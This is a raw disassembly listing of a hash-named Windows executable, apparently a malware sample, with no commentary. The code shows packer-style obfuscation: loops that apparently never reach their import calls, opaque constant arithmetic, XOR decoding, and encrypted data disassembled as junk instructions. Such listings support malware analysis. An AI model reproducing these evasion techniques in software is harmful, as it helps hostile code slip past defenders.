
04202b9babc91c6787359e47459dd579c1b44805b7503266583e06c7ad4c844f.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xa4
  401009:	mov    ecx,DWORD PTR [ebp+0x8]
  40100c:	and    DWORD PTR ds:0x425010,0x0
  401016:	jmp    0x401026
  40101b:	mov    eax,ds:0x425010
  401020:	inc    eax
  401021:	mov    ds:0x425010,eax
  401026:	cmp    DWORD PTR ds:0x425010,0x1f
  40102d:	jae    0x401080
  401033:	cmp    DWORD PTR ds:0x425010,0x7
  40103a:	jne    0x40105d
  401040:	push   0x36e0
  401045:	push   0x6272
  40104a:	push   0x42500c
  40104f:	push   0x428f
  401054:	push   DWORD PTR [ebp-0xc]
  401057:	call   DWORD PTR ds:0x421000
  40105d:	cmp    DWORD PTR ds:0x425010,0x6
  401064:	jne    0x401075
  40106a:	mov    eax,ds:0x425010
  40106f:	inc    eax
  401070:	mov    ds:0x425010,eax
  401075:	jmp    0x40101b
  40107a:	or     DWORD PTR ds:0x427010,edx
  401080:	mov    eax,0x8a85
  401085:	or     DWORD PTR ds:0x427008,0x42601c
  40108f:	xor    ax,WORD PTR [ecx+0x20]
  401093:	and    DWORD PTR ds:0x429008,0x0
  40109d:	jmp    0x4010af
  4010a2:	mov    ecx,DWORD PTR ds:0x429008
  4010a8:	inc    ecx
  4010a9:	mov    DWORD PTR ds:0x429008,ecx
  4010af:	cmp    DWORD PTR ds:0x429008,0x1d
  4010b6:	jae    0x4010f5
  4010bc:	cmp    DWORD PTR ds:0x429008,0xc
  4010c3:	jne    0x4010d4
  4010c9:	push   0x803a
  4010ce:	call   DWORD PTR ds:0x421048
  4010d4:	cmp    DWORD PTR ds:0x429008,0xb
  4010db:	jne    0x4010f0
  4010e1:	xor    ecx,ecx
  4010e3:	xor    ecx,DWORD PTR ds:0x429008
  4010e9:	inc    ecx
  4010ea:	mov    DWORD PTR ds:0x429008,ecx
  4010f0:	jmp    0x4010a2
  4010f5:	mov    ecx,0x3b4b
  4010fa:	inc    DWORD PTR ds:0x427010
  401100:	add    ax,cx
  401103:	movzx  eax,ax
  401106:	adc    ecx,DWORD PTR ds:0x428010
  40110c:	mov    DWORD PTR [ebp-0x18],eax
  40110f:	mov    ecx,DWORD PTR ds:0x41d26c
  401115:	mov    ecx,DWORD PTR [ecx]
  401117:	sub    DWORD PTR ds:0x429014,ecx
  40111d:	mov    BYTE PTR [ebp-0x1],0x61
  401121:	and    DWORD PTR ds:0x428008,ebx
  401127:	lea    eax,[ebp-0x1]
  40112a:	sbb    ecx,0x3fcf
  401130:	mov    DWORD PTR [ebp-0x10],eax
  401133:	xor    ecx,ecx
  401135:	xor    ecx,DWORD PTR ds:0x425024
  40113b:	adc    ecx,DWORD PTR ds:0x427004
  401141:	mov    DWORD PTR ds:0x425024,ecx
  401147:	mov    al,BYTE PTR [ebp-0x1]
  40114a:	mov    ecx,DWORD PTR ds:0x42901c
  401150:	sub    DWORD PTR ds:0x42500c,ecx
  401156:	mov    ecx,DWORD PTR [ebp-0x10]
  401159:	xor    al,0x6f
  40115b:	xor    DWORD PTR ds:0x427004,0x42500c
  401165:	sub    al,0xd
  401167:	mov    BYTE PTR [ecx],al
  401169:	adc    DWORD PTR ds:0x429008,0x362f
  401173:	mov    DWORD PTR [ebp-0x14],0xf89c85b6
  40117a:	mov    DWORD PTR ds:0x425020,0x1b
  401184:	cmp    DWORD PTR ds:0x425020,0x0
  40118b:	je     0x4011bb
  401191:	cmp    DWORD PTR ds:0x425020,0x24
  401198:	jne    0x4011a7
  40119e:	push   DWORD PTR [ebp-0x1c]
  4011a1:	call   DWORD PTR ds:0x421004
  4011a7:	mov    ecx,DWORD PTR ds:0x425020
  4011ad:	dec    ecx
  4011ae:	mov    DWORD PTR ds:0x425020,ecx
  4011b4:	jmp    0x401184
  4011b9:	sub    ecx,eax
  4011bb:	push   ebx
  4011bc:	and    DWORD PTR ds:0x42501c,ebx
  4011c2:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  4011c9:	mov    ecx,DWORD PTR [ebp-0x14]
  4011cc:	push   esi
  4011cd:	mov    eax,0x7510893
  4011d2:	or     esi,DWORD PTR ds:0x42500c
  4011d8:	xor    ecx,eax
  4011da:	and    DWORD PTR ds:0x425024,0x1a45
  4011e4:	mov    esi,0x3272db
  4011e9:	sub    DWORD PTR ds:0x428018,0x2ac6
  4011f3:	push   edi
  4011f4:	and    DWORD PTR ds:0x426014,0x5a76
  4011fe:	add    ecx,esi
  401200:	jmp    0x401210
  401205:	mov    dl,BYTE PTR [ebp-0x1]
  401208:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  40120f:	inc    ecx
  401210:	mov    DWORD PTR ds:0x427010,0x6b59
  40121a:	cmp    ecx,0x40
  40121d:	mov    DWORD PTR ds:0x425020,0x57b3
  401227:	jb     0x401205
  40122d:	mov    edx,DWORD PTR [ebp-0x14]
  401230:	xor    edx,eax
  401232:	add    edx,esi
  401234:	mov    DWORD PTR ds:0x425010,0x7b99
  40123e:	jmp    0x4012e7
  401243:	adc    ecx,DWORD PTR ds:0x427014
  401249:	mov    edi,DWORD PTR [ebp+0x8]
  40124c:	sbb    DWORD PTR ds:0x426014,ebx
  401252:	mov    ecx,0x8a85
  401257:	sub    DWORD PTR ds:0x425014,0x206e
  401261:	xor    cx,WORD PTR [edi+edx*4+0x2]
  401266:	xor    edi,0x3e7b
  40126c:	mov    edi,0x3b4b
  401271:	and    DWORD PTR ds:0x425000,0x427018
  40127b:	add    cx,di
  40127e:	add    DWORD PTR ds:0x42901c,0x429008
  401288:	movzx  ecx,cx
  40128b:	sbb    DWORD PTR ds:0x428004,0x754
  401295:	mov    DWORD PTR [ebp-0x10],ecx
  401298:	sub    DWORD PTR ds:0x42800c,0x1052
  4012a2:	mov    ecx,DWORD PTR [ebp+0x8]
  4012a5:	xor    DWORD PTR ds:0x426018,0x427004
  4012af:	movzx  ecx,WORD PTR [ecx+edx*4]
  4012b3:	or     DWORD PTR ds:0x429018,0x4238
  4012bd:	xor    ecx,0x8a85
  4012c3:	sbb    DWORD PTR ds:0x426014,0x4641
  4012cd:	add    ecx,edi
  4012cf:	mov    DWORD PTR ds:0x428018,ecx
  4012d5:	mov    edi,DWORD PTR [ebp-0x10]
  4012d8:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  4012df:	movzx  ecx,BYTE PTR ds:0x425000
  4012e6:	inc    edx
  4012e7:	mov    ecx,DWORD PTR [ebp-0x18]
  4012ea:	mov    DWORD PTR ds:0x428014,0x5338
  4012f4:	cmp    edx,ecx
  4012f6:	mov    DWORD PTR ds:0x425020,0x6df9
  401300:	jne    0x401243
  401306:	mov    ecx,DWORD PTR [ebp-0x14]
  401309:	mov    DWORD PTR ds:0x425010,0x1f
  401313:	cmp    DWORD PTR ds:0x425010,0x0
  40131a:	je     0x401367
  401320:	cmp    DWORD PTR ds:0x425010,0x25
  401327:	jne    0x40134b
  40132d:	push   0x41fefb
  401332:	push   0x8a20
  401337:	push   DWORD PTR [ebp-0x10]
  40133a:	push   DWORD PTR [ebp-0x14]
  40133d:	push   0x4d55
  401342:	push   DWORD PTR [ebp-0x1c]
  401345:	call   DWORD PTR ds:0x42104c
  40134b:	mov    edx,DWORD PTR ds:0x425010
  401351:	dec    edx
  401352:	mov    DWORD PTR ds:0x425010,edx
  401358:	jmp    0x401313
  40135d:	xor    DWORD PTR ds:0x428008,0x4304
  401367:	mov    edx,DWORD PTR [ebp+0x10]
  40136a:	add    DWORD PTR ds:0x425008,0x427004
  401374:	xor    ecx,eax
  401376:	or     DWORD PTR ds:0x426014,0x42701c
  401380:	add    ecx,esi
  401382:	mov    DWORD PTR [edx],ecx
  401384:	sbb    DWORD PTR ds:0x429004,0x53ee
  40138e:	mov    ecx,DWORD PTR [ebp-0x14]
  401391:	xor    ecx,eax
  401393:	add    ecx,esi
  401395:	mov    DWORD PTR [ebp-0x20],ecx
  401398:	mov    DWORD PTR [ebp+0x8],0xf89c85b6
  40139f:	mov    DWORD PTR [ebp-0xc],0xf89c85a6
  4013a6:	mov    DWORD PTR [ebp-0x1c],0xf89c95b6
  4013ad:	mov    ecx,DWORD PTR [ebp-0xc]
  4013b0:	mov    DWORD PTR [ebp+0x8],ecx
  4013b3:	mov    DWORD PTR ds:0x42801c,0x197a
  4013bd:	jmp    0x4015fd
  4013c2:	movzx  edx,BYTE PTR ds:0x426010
  4013c9:	sbb    DWORD PTR ds:0x42600c,edx
  4013cf:	mov    ecx,DWORD PTR [ebp+0x8]
  4013d2:	xor    edx,edx
  4013d4:	xor    edx,DWORD PTR ds:0x426018
  4013da:	or     edx,DWORD PTR ds:0x42500c
  4013e0:	mov    DWORD PTR ds:0x426018,edx
  4013e6:	mov    edx,DWORD PTR [ebp-0x8]
  4013e9:	xor    ecx,eax
  4013eb:	mov    DWORD PTR ds:0x427008,0x2495
  4013f5:	xor    edx,eax
  4013f7:	add    DWORD PTR ds:0x426010,0x397c
  401401:	sub    ecx,edx
  401403:	sub    DWORD PTR ds:0x425020,0x386b
  40140d:	sub    ecx,esi
  40140f:	xor    edx,edx
  401411:	or     edx,DWORD PTR ds:0x428004
  401417:	sub    DWORD PTR ds:0x42501c,edx
  40141d:	xor    ecx,eax
  40141f:	mov    DWORD PTR [ebp+0x8],ecx
  401422:	mov    ecx,DWORD PTR [ebp+0x8]
  401425:	mov    edx,DWORD PTR [ebp-0x64]
  401428:	lea    ecx,[edx+ecx*1+0x5708f5]
  40142f:	mov    DWORD PTR [ebp-0x64],ecx
  401432:	mov    DWORD PTR ds:0x428004,0x1f
  40143c:	cmp    DWORD PTR ds:0x428004,0x0
  401443:	je     0x40147a
  401449:	cmp    DWORD PTR ds:0x428004,0x29
  401450:	jne    0x401466
  401456:	push   0x41ff71
  40145b:	push   0x870a
  401460:	call   DWORD PTR ds:0x421008
  401466:	mov    ecx,DWORD PTR ds:0x428004
  40146c:	dec    ecx
  40146d:	mov    DWORD PTR ds:0x428004,ecx
  401473:	jmp    0x40143c
  401478:	and    edx,ecx
  40147a:	mov    ecx,DWORD PTR [ebp+0x8]
  40147d:	or     edx,DWORD PTR ds:0x429014
  401483:	mov    edx,DWORD PTR [ebp-0x60]
  401486:	sbb    DWORD PTR ds:0x42501c,0x5031
  401490:	lea    ecx,[edx+ecx*1+0x5708f5]
  401497:	inc    edx
  401498:	mov    DWORD PTR [ebp-0x60],ecx
  40149b:	mov    ecx,DWORD PTR [ebp+0x8]
  40149e:	mov    edx,DWORD PTR [ebp-0x5c]
  4014a1:	sub    DWORD PTR ds:0x429018,0x425020
  4014ab:	lea    ecx,[edx+ecx*1+0x5708f4]
  4014b2:	and    DWORD PTR ds:0x429010,0x0
  4014bc:	mov    edx,DWORD PTR ds:0x429010
  4014c2:	inc    edx
  4014c3:	mov    DWORD PTR ds:0x429010,edx
  4014c9:	cmp    DWORD PTR ds:0x429010,0x1b
  4014d0:	jne    0x4014e1
  4014d6:	push   0x8182
  4014db:	call   DWORD PTR ds:0x421014
  4014e1:	cmp    DWORD PTR ds:0x429010,0x11
  4014e8:	jb     0x4014bc
  4014ee:	mov    DWORD PTR [ebp-0x5c],ecx
  4014f1:	sbb    edx,0x6f22
  4014f7:	mov    ecx,DWORD PTR [ebp+0x8]
  4014fa:	and    DWORD PTR ds:0x425008,0x0
  401504:	mov    edx,DWORD PTR ds:0x425008
  40150a:	inc    edx
  40150b:	mov    DWORD PTR ds:0x425008,edx
  401511:	cmp    DWORD PTR ds:0x425008,0x16
  401518:	jne    0x40152e
  40151e:	push   0x41ff91
  401523:	push   0x41fecb
  401528:	call   DWORD PTR ds:0x421050
  40152e:	cmp    DWORD PTR ds:0x425008,0x14
  401535:	jb     0x401504
  40153b:	mov    edx,DWORD PTR [ebp-0x58]
  40153e:	xor    DWORD PTR ds:0x429008,0x42900c
  401548:	lea    ecx,[edx+ecx*1+0x5708fb]
  40154f:	and    DWORD PTR ds:0x42801c,0x0
  401559:	mov    edx,DWORD PTR ds:0x42801c
  40155f:	inc    edx
  401560:	mov    DWORD PTR ds:0x42801c,edx
  401566:	cmp    DWORD PTR ds:0x42801c,0x1f
  40156d:	jne    0x401583
  401573:	push   0x3426
  401578:	push   0x86d1
  40157d:	call   DWORD PTR ds:0x421054
  401583:	cmp    DWORD PTR ds:0x42801c,0x17
  40158a:	jb     0x401559
  401590:	mov    DWORD PTR [ebp-0x58],ecx
  401593:	mov    ecx,DWORD PTR [ebp+0x8]
  401596:	mov    edx,DWORD PTR [ebp-0x54]
  401599:	lea    ecx,[edx+ecx*1+0x5708fa]
  4015a0:	and    DWORD PTR ds:0x426010,0x0
  4015aa:	mov    edx,DWORD PTR ds:0x426010
  4015b0:	inc    edx
  4015b1:	mov    DWORD PTR ds:0x426010,edx
  4015b7:	cmp    DWORD PTR ds:0x426010,0x2b
  4015be:	jne    0x4015cd
  4015c4:	push   DWORD PTR [ebp-0x24]
  4015c7:	call   DWORD PTR ds:0x421018
  4015cd:	cmp    DWORD PTR ds:0x426010,0x1e
  4015d4:	jb     0x4015aa
  4015da:	mov    DWORD PTR [ebp-0x54],ecx
  4015dd:	or     ecx,0x6900
  4015e3:	mov    ecx,DWORD PTR [ebp+0x8]
  4015e6:	and    DWORD PTR ds:0x426000,0x2d7e
  4015f0:	mov    edx,DWORD PTR [ebp-0x50]
  4015f3:	lea    ecx,[edx+ecx*1+0x5708f9]
  4015fa:	mov    DWORD PTR [ebp-0x50],ecx
  4015fd:	xor    ecx,0x7fc1
  401603:	mov    ecx,DWORD PTR [ebp+0x8]
  401606:	xor    ecx,eax
  401608:	add    ecx,esi
  40160a:	jne    0x4013c2
  401610:	mov    DWORD PTR ds:0x425028,0xb4d
  40161a:	jmp    0x401891
  40161f:	and    DWORD PTR ds:0x425024,0x0
  401629:	jmp    0x40163b
  40162e:	mov    edx,DWORD PTR ds:0x425024
  401634:	inc    edx
  401635:	mov    DWORD PTR ds:0x425024,edx
  40163b:	cmp    DWORD PTR ds:0x425024,0x13
  401642:	jae    0x40168a
  401648:	cmp    DWORD PTR ds:0x425024,0x4
  40164f:	jne    0x40166b
  401655:	push   0x84c6
  40165a:	push   DWORD PTR [ebp-0xc]
  40165d:	push   DWORD PTR [ebp-0x10]
  401660:	push   0x5448
  401665:	call   DWORD PTR ds:0x42101c
  40166b:	cmp    DWORD PTR ds:0x425024,0x3
  401672:	jne    0x401685
  401678:	mov    edx,DWORD PTR ds:0x425024
  40167e:	inc    edx
  40167f:	mov    DWORD PTR ds:0x425024,edx
  401685:	jmp    0x40162e
  40168a:	mov    ecx,DWORD PTR [ebp-0x1c]
  40168d:	or     DWORD PTR ds:0x427010,0x1874
  401697:	mov    edx,DWORD PTR [ebp-0x8]
  40169a:	or     DWORD PTR ds:0x42900c,0x427008
  4016a4:	xor    ecx,eax
  4016a6:	add    DWORD PTR ds:0x425028,0x427010
  4016b0:	xor    edx,eax
  4016b2:	sub    ecx,edx
  4016b4:	sub    ecx,esi
  4016b6:	xor    ecx,eax
  4016b8:	mov    DWORD PTR ds:0x426018,0x1f6a
  4016c2:	mov    DWORD PTR [ebp-0x1c],ecx
  4016c5:	mov    ecx,DWORD PTR [ebp-0xc]
  4016c8:	mov    DWORD PTR [ebp+0x8],ecx
  4016cb:	jmp    0x4016fd
  4016d0:	mov    ecx,DWORD PTR [ebp+0x8]
  4016d3:	mov    edx,DWORD PTR [ebp-0x8]
  4016d6:	xor    ecx,eax
  4016d8:	xor    edx,eax
  4016da:	sub    ecx,edx
  4016dc:	sub    ecx,esi
  4016de:	xor    ecx,eax
  4016e0:	mov    DWORD PTR [ebp+0x8],ecx
  4016e3:	mov    ecx,DWORD PTR [ebp+0x8]
  4016e6:	mov    edx,DWORD PTR [ebp+0x8]
  4016e9:	imul   edx,edx,0x5708f5
  4016ef:	xor    ecx,eax
  4016f1:	add    ecx,esi
  4016f3:	lea    ecx,[ebp+ecx*4-0x64]
  4016f7:	mov    edi,DWORD PTR [ecx]
  4016f9:	add    edx,edi
  4016fb:	mov    DWORD PTR [ecx],edx
  4016fd:	mov    ecx,DWORD PTR [ebp+0x8]
  401700:	xor    ecx,eax
  401702:	add    ecx,esi
  401704:	jne    0x4016d0
  40170a:	mov    ecx,DWORD PTR [ebp-0x20]
  40170d:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  401714:	mov    dl,BYTE PTR [ebp-0x1]
  401717:	cmp    cl,dl
  401719:	je     0x4017f2
  40171f:	mov    ecx,DWORD PTR [ebp-0x20]
  401722:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  401729:	mov    edx,DWORD PTR [ebp+0xc]
  40172c:	cmp    cl,BYTE PTR [edx]
  40172e:	jne    0x4018a3
  401734:	mov    ecx,DWORD PTR [ebp-0x14]
  401737:	mov    edx,DWORD PTR [ebp+0xc]
  40173a:	movsx  edx,BYTE PTR [edx]
  40173d:	xor    ecx,eax
  40173f:	add    ecx,esi
  401741:	cmp    edx,ecx
  401743:	mov    ecx,DWORD PTR [ebp-0xc]
  401746:	mov    DWORD PTR [ebp+0x8],ecx
  401749:	mov    ecx,DWORD PTR [ebp+0x8]
  40174c:	je     0x403ca2
  401752:	jmp    0x401787
  401757:	mov    ecx,DWORD PTR [ebp+0x8]
  40175a:	mov    edx,DWORD PTR [ebp-0x8]
  40175d:	xor    ecx,eax
  40175f:	xor    edx,eax
  401761:	sub    ecx,edx
  401763:	sub    ecx,esi
  401765:	xor    ecx,eax
  401767:	mov    DWORD PTR [ebp+0x8],ecx
  40176a:	mov    ecx,DWORD PTR [ebp+0x8]
  40176d:	mov    edx,DWORD PTR [ebp+0x8]
  401770:	xor    ecx,eax
  401772:	imul   edx,edx,0x5708f5
  401778:	add    ecx,esi
  40177a:	lea    ecx,[ebp+ecx*4-0x64]
  40177e:	mov    edi,DWORD PTR [ecx]
  401780:	add    edx,edi
  401782:	mov    DWORD PTR [ecx],edx
  401784:	mov    ecx,DWORD PTR [ebp+0x8]
  401787:	xor    ecx,eax
  401789:	add    ecx,esi
  40178b:	jne    0x401757
  401791:	mov    ecx,DWORD PTR [ebp-0x14]
  401794:	mov    edx,DWORD PTR [ebp+0x8]
  401797:	xor    ecx,eax
  401799:	xor    edx,eax
  40179b:	add    ecx,esi
  40179d:	add    edx,esi
  40179f:	cmp    ecx,edx
  4017a1:	jae    0x401837
  4017a7:	lea    edx,[ecx-0x3272db]
  4017ad:	mov    DWORD PTR [ebp-0x18],edx
  4017b0:	mov    edi,DWORD PTR [ebp-0x18]
  4017b3:	mov    DWORD PTR [ebp-0x24],0x705fd08
  4017ba:	lea    edx,[ebp-0x24]
  4017bd:	mov    DWORD PTR [ebp-0x10],edx
  4017c0:	mov    edx,DWORD PTR [ebp-0x10]
  4017c3:	add    DWORD PTR [edx],0x705fa08
  4017c9:	mov    ebx,DWORD PTR [ebp-0x10]
  4017cc:	xor    edi,eax
  4017ce:	add    edi,DWORD PTR [ebx]
  4017d0:	lea    edx,[ebp+ecx*4-0x64]
  4017d4:	mov    ebx,DWORD PTR [edx]
  4017d6:	xor    edi,ebx
  4017d8:	mov    DWORD PTR [edx],edi
  4017da:	mov    edx,DWORD PTR [ebp+0x8]
  4017dd:	xor    edx,eax
  4017df:	inc    ecx
  4017e0:	inc    DWORD PTR [ebp-0x18]
  4017e3:	add    edx,esi
  4017e5:	cmp    ecx,edx
  4017e7:	jb     0x4017b0
  4017ed:	jmp    0x401837
  4017f2:	mov    ecx,DWORD PTR [ebp-0xc]
  4017f5:	mov    DWORD PTR [ebp+0x8],ecx
  4017f8:	jmp    0x40182a
  4017fd:	mov    ecx,DWORD PTR [ebp+0x8]
  401800:	mov    edx,DWORD PTR [ebp-0x8]
  401803:	xor    ecx,eax
  401805:	xor    edx,eax
  401807:	sub    ecx,edx
  401809:	sub    ecx,esi
  40180b:	xor    ecx,eax
  40180d:	mov    DWORD PTR [ebp+0x8],ecx
  401810:	mov    ecx,DWORD PTR [ebp+0x8]
  401813:	mov    edx,DWORD PTR [ebp+0x8]
  401816:	imul   edx,edx,0x5708f5
  40181c:	xor    ecx,eax
  40181e:	add    ecx,esi
  401820:	lea    ecx,[ebp+ecx*4-0x64]
  401824:	mov    edi,DWORD PTR [ecx]
  401826:	add    edx,edi
  401828:	mov    DWORD PTR [ecx],edx
  40182a:	mov    ecx,DWORD PTR [ebp+0x8]
  40182d:	xor    ecx,eax
  40182f:	add    ecx,esi
  401831:	jne    0x4017fd
  401837:	mov    ecx,DWORD PTR [ebp-0xc]
  40183a:	mov    DWORD PTR [ebp+0x8],ecx
  40183d:	jmp    0x40186f
  401842:	mov    ecx,DWORD PTR [ebp+0x8]
  401845:	mov    edx,DWORD PTR [ebp-0x8]
  401848:	xor    ecx,eax
  40184a:	xor    edx,eax
  40184c:	sub    ecx,edx
  40184e:	sub    ecx,esi
  401850:	xor    ecx,eax
  401852:	mov    DWORD PTR [ebp+0x8],ecx
  401855:	mov    ecx,DWORD PTR [ebp+0x8]
  401858:	mov    edx,DWORD PTR [ebp+0x8]
  40185b:	imul   edx,edx,0x5708f5
  401861:	xor    ecx,eax
  401863:	add    ecx,esi
  401865:	lea    ecx,[ebp+ecx*4-0x64]
  401869:	mov    edi,DWORD PTR [ecx]
  40186b:	add    edx,edi
  40186d:	mov    DWORD PTR [ecx],edx
  40186f:	mov    ecx,DWORD PTR [ebp+0x8]
  401872:	xor    ecx,eax
  401874:	add    ecx,esi
  401876:	jne    0x401842
  40187c:	mov    ecx,DWORD PTR [ebp-0x8]
  40187f:	mov    edx,DWORD PTR [ebp-0x20]
  401882:	xor    ecx,eax
  401884:	lea    ecx,[ecx+edx*1+0x3272db]
  40188b:	mov    DWORD PTR [ebp-0x20],ecx
  40188e:	inc    DWORD PTR [ebp+0xc]
  401891:	mov    ecx,DWORD PTR [ebp-0x1c]
  401894:	xor    ecx,eax
  401896:	add    ecx,esi
  401898:	jne    0x40161f
  40189e:	jmp    0x403cac
  4018a3:	mov    ecx,DWORD PTR [ebp-0xc]
  4018a6:	mov    DWORD PTR [ebp+0x8],ecx
  4018a9:	jmp    0x4018db
  4018ae:	mov    ecx,DWORD PTR [ebp+0x8]
  4018b1:	mov    edx,DWORD PTR [ebp-0x8]
  4018b4:	xor    ecx,eax
  4018b6:	xor    edx,eax
  4018b8:	sub    ecx,edx
  4018ba:	sub    ecx,esi
  4018bc:	xor    ecx,eax
  4018be:	mov    DWORD PTR [ebp+0x8],ecx
  4018c1:	mov    ecx,DWORD PTR [ebp+0x8]
  4018c4:	mov    edx,DWORD PTR [ebp+0x8]
  4018c7:	imul   edx,edx,0x5708f5
  4018cd:	xor    ecx,eax
  4018cf:	add    ecx,esi
  4018d1:	lea    ecx,[ebp+ecx*4-0x64]
  4018d5:	mov    edi,DWORD PTR [ecx]
  4018d7:	add    edx,edi
  4018d9:	mov    DWORD PTR [ecx],edx
  4018db:	mov    ecx,DWORD PTR [ebp+0x8]
  4018de:	xor    ecx,eax
  4018e0:	add    ecx,esi
  4018e2:	jne    0x4018ae
  4018e8:	jmp    0x403cb8
  4018ed:	mov    ecx,DWORD PTR [ebp+0x8]
  4018f0:	mov    edx,DWORD PTR [ebp-0x8]
  4018f3:	xor    ecx,eax
  4018f5:	xor    edx,eax
  4018f7:	sub    ecx,edx
  4018f9:	sub    ecx,esi
  4018fb:	jmp    0x403c80
  401900:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401901:	js     0x401926
  401903:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401904:	mov    ds:0x673a7a3,eax
  401909:	je     0x401894
  40190b:	stos   DWORD PTR es:[edi],eax
  40190c:	mov    ebx,0x6264fb56
  401911:	bound  esp,QWORD PTR [edx+0x62]
  401914:	sbb    bl,BYTE PTR [edi+0x62]
  401917:	bound  ecx,QWORD PTR [ecx]
  401919:	xor    BYTE PTR [edi],al
  40191b:	cmp    eax,0xf033905
  401920:	jns    0x4018b2
  401922:	jbe    0x40199a
  401924:	pop    ebp
  401925:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401926:	jb     0x40199a
  401928:	jno    0x401954
  40192a:	fld    st(0)
  40192c:	std    
  40192d:	dec    esp
  40192e:	push   esp
  40192f:	jae    0x4019ae
  401931:	inc    ebx
  401932:	mov    WORD PTR [ecx+esi*2+0x45],?
  401936:	scas   eax,DWORD PTR es:[edi]
  401937:	inc    ecx
  401938:	push   edx
  401939:	cmp    al,0x90
  40193b:	loop   0x4018d4
  40193d:	data16 jnp 0x40196b
  401940:	call   0x26d1:0xfbbbb819
  401947:	hlt    
  401948:	xor    BYTE PTR [ebx+0x5811b5de],bl
  40194e:	dec    ebp
  40194f:	and    bl,cl
  401951:	std    
  401952:	pop    ds
  401953:	int    0x30
  401955:	xor    BYTE PTR [ebx+0x79a0c1de],cl
  40195b:	test   al,0x21
  40195d:	mov    al,ds:0x6ad39963
  401962:	clc    
  401963:	cmp    DWORD PTR [edi-0x74],esi
  401966:	mov    ecx,DWORD PTR [ebx+0x38d84edc]
  40196c:	mov    ecx,0x536582b9
  401971:	mov    ch,0x26
  401973:	idiv   BYTE PTR es:[ebx+0x2a413552]
  40197a:	push   es
  40197b:	arpl   sp,bx
  40197d:	push   edi
  40197e:	jne    0x401920
  401980:	and    ch,bh
  401982:	stos   BYTE PTR es:[edi],al
  401983:	adc    al,0xd1
  401985:	cmp    esi,eax
  401987:	mov    al,0x56
  401989:	dec    edi
  40198a:	ret    
  40198b:	adc    al,0x67
  40198d:	and    ebx,DWORD PTR [eax-0x5a2f20df]
  401993:	jmp    0x43e55a22
  401998:	fwait
  401999:	into   
  40199a:	or     al,0xa3
  40199c:	div    DWORD PTR [edi+0x5]
  40199f:	mov    esi,0x9d47fa53
  4019a4:	add    ebx,esi
  4019a6:	retw   0x3f19
  4019aa:	sti    
  4019ab:	retf   0xf32e
  4019ae:	xor    esi,DWORD PTR [ebx]
  4019b0:	or     edi,edx
  4019b2:	and    BYTE PTR [edx+0x78],ah
  4019b5:	or     BYTE PTR [edi+0x32],bl
  4019b8:	mov    esi,0xf629a6f1
  4019bd:	pop    es
  4019be:	sub    BYTE PTR cs:[ebp+0x29],bh
  4019c2:	rcr    dh,cl
  4019c4:	add    eax,0x2a430c05
  4019c9:	pop    edx
  4019ca:	gs stos BYTE PTR es:[edi],al
  4019cc:	les    esp,FWORD PTR [ecx-0xc]
  4019cf:	dec    esi
  4019d0:	mov    bl,ch
  4019d2:	mov    bh,0x9c
  4019d4:	ret    
  4019d5:	mov    al,ds:0xaff5bc57
  4019da:	cmp    edi,DWORD PTR [esi+0x7c]
  4019dd:	add    BYTE PTR [eax-0x5bb4ddb6],ch
  4019e3:	inc    eax
  4019e4:	jne    0x40196c
  4019e6:	mov    dl,BYTE PTR [esi]
  4019e8:	add    dh,bh
  4019ea:	shr    DWORD PTR [esi-0x4343c2ea],1
  4019f0:	mov    edx,0x5aae3c9e
  4019f5:	xchg   ecx,eax
  4019f6:	and    al,0xa9
  4019f8:	jns    0x4019ad
  4019fa:	xor    eax,0x18e0d505
  4019ff:	mov    dl,0xfc
  401a01:	gs jge 0x401a5e
  401a04:	inc    ebp
  401a05:	xchg   ecx,eax
  401a06:	pop    ds
  401a07:	jp     0x401a3f
  401a09:	xchg   ebx,eax
  401a0a:	aaa    
  401a0b:	fimul  DWORD PTR gs:[esi-0x5f7eb2f0]
  401a12:	fmul   QWORD PTR [edx-0x268f72c6]
  401a18:	mov    cl,dl
  401a1a:	cmp    esi,DWORD PTR [ecx+0x2a62670b]
  401a20:	xlat   BYTE PTR ds:[ebx]
  401a21:	dec    ebp
  401a22:	push   ebx
  401a23:	adc    al,0xea
  401a25:	rcr    BYTE PTR [ebp-0x7727e503],cl
  401a2b:	jae    0x401a65
  401a2d:	sub    esi,eax
  401a2f:	loope  0x401a1f
  401a31:	jp     0x401aaa
  401a33:	sub    eax,0x65312d9
  401a38:	scas   al,BYTE PTR es:[edi]
  401a39:	jb     0x401ab1
  401a3b:	cmp    eax,0x11537a1d
  401a40:	add    edi,DWORD PTR [ecx]
  401a42:	rcl    bh,1
  401a44:	inc    edi
  401a45:	jae    0x401a33
  401a47:	jno    0x401a1b
  401a49:	aaa    
  401a4a:	ins    BYTE PTR es:[edi],dx
  401a4b:	std    
  401a4c:	add    eax,0xb8be773f
  401a51:	or     esp,DWORD PTR [esi-0x5d]
  401a54:	leave  
  401a55:	adc    eax,0x8eae1038
  401a5a:	xchg   edx,eax
  401a5b:	scas   eax,DWORD PTR es:[edi]
  401a5c:	or     eax,DWORD PTR [esp+eax*2+0x37f1dbd4]
  401a63:	setb   ch
  401a66:	xchg   DWORD PTR [esi-0x5637424d],ebx
  401a6c:	pop    esi
  401a6d:	out    dx,al
  401a6e:	xchg   BYTE PTR ds:[esi+ebp*2+0x1e],al
  401a73:	inc    edi
  401a74:	and    BYTE PTR [ecx-0x2b4602d5],dh
  401a7a:	jbe    0x401ac3
  401a7c:	jno    0x401a19
  401a7e:	inc    esp
  401a7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a80:	xchg   ebp,eax
  401a81:	adc    BYTE PTR [ebp-0x6bc4788a],cl
  401a87:	fbld   TBYTE PTR [ebp+0x1298b1be]
  401a8d:	fistp  WORD PTR [edi-0xf]
  401a90:	push   ebx
  401a91:	pop    esp
  401a92:	sahf   
  401a93:	xchg   esp,eax
  401a94:	mov    ds:0x8d39e8fe,al
  401a99:	xor    bh,BYTE PTR [ecx]
  401a9b:	inc    eax
  401a9c:	pop    ds
  401a9d:	loop   0x401ab8
  401a9f:	iret   
  401aa0:	mov    ebp,0x20ee00a5
